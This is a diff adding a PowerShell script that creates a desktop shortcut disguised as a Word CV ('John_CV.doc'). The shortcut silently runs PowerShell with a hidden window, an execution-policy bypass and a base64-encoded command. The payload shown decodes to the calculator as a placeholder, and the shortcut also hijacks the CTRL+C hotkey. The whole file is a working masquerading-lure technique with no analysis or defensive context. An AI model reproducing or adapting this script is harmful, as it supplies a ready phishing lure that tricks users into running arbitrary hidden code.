@@ -1,0 +1,12 @@
+$payload = "YwBhAGwAYwAuAGUAeABlAA==";
+$path = "$([Environment]::GetFolderPath('Desktop'))\John_CV.doc.lnk";
+$wshell = New-Object -ComObject Wscript.Shell;
+$shortcut = $wshell.CreateShortcut($path);
+$shortcut.IconLocation = "C:\Windows\System32\shell32.dll,1";
+$shortcut.TargetPath = "powershell.exe";
+$shortcut.Arguments = "-ep b -nop -wind h -e " + $payload;
+$shortcut.WorkingDirectory = "C:";
+$shortcut.HotKey = "CTRL+C";
+$shortcut.Description = "John_CV.doc";
+$shortcut.WindowStyle = 7;
+$shortcut.Save();
